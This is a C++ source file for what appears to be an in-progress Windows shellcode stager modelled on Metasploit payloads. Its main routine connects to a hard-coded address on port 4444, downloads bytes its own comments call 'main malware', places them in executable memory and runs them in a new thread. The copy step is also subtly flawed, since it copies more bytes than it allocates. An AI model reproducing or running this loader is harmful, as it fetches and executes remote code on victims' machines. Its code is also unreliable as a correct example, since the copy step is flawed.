/* TODO:
 * https://github.com/rapid7/metasploit-framework/tree/master/data/headers/windows
 * https://github.com/rapid7/metasploit-framework/tree/master/data/templates/src/pe
 * https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows
 *
 * https://github.com/rapid7/metasploit-framework/tree/master/data/utilities/encrypted_payload
 *
 *
 *
 * */

// TODO: eventually convert to c code then asm then shell code?

#include "stager.h"
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

bool Stager::run(const std::string& host, const std::string& port)
{
    // manually resolve apis (skip for now and just include the headers that import it)

    // connect to server
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    // create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ADDRINFOA hints, *result = nullptr; // struct addrinfo 

    ZeroMemory(&hints, sizeof(hints));
    // memset(&hints, 0, sizeof(hints)); // use this instead of zeromemory for cross platform

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    std::cout << "2" << std::endl;
    // Resolve address
    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0)
    {
        return false;
    }

    std::cout << "3" << std::endl;
    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        // create connection
        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) != SOCKET_ERROR)
        {
            break;
        }
    }
    freeaddrinfo(result);


    // download main malware

    //const unsigned int MAX_BEACON_SIZE = 500000;
	std::vector<unsigned char> shellcode(4096);

    std::cout << "4" << std::endl;
    //recv(sock, (char*)shellcode.data(), shellcode.size(), 0);
    int bytes_received = recv(sock, (char*)shellcode.data(), shellcode.size(), 0);
    
    std::cout << "5" << std::endl;
    // allocate memory?
    //LPVOID beacon_mem = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LPVOID beacon_mem = VirtualAlloc(0, bytes_received, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (beacon_mem == NULL)
    {
        std::cout << "virtualalloc failed" << std::endl;
    }
    // TODO: this only recv when bytes recv is already over max?
    //recv(sock, (char*)beacon_mem, beacon_size, 0);
    
    // COPY the received shellcode to executable memory
    memcpy(beacon_mem, shellcode.data(), shellcode.size());
    std::cout << "6" << std::endl;
    // execute malware
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
   
    WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
    std::cout << "7" << std::endl;
    // cleanup
    closesocket(sock);
    WSACleanup();
    std::cout << "8" << std::endl;
    return 0;
}

int main()
{
    Stager tcpStager;
    tcpStager.run("172.18.245.234", "4444");
    //tcpStager.run("10.0.0.48", "4444");
}


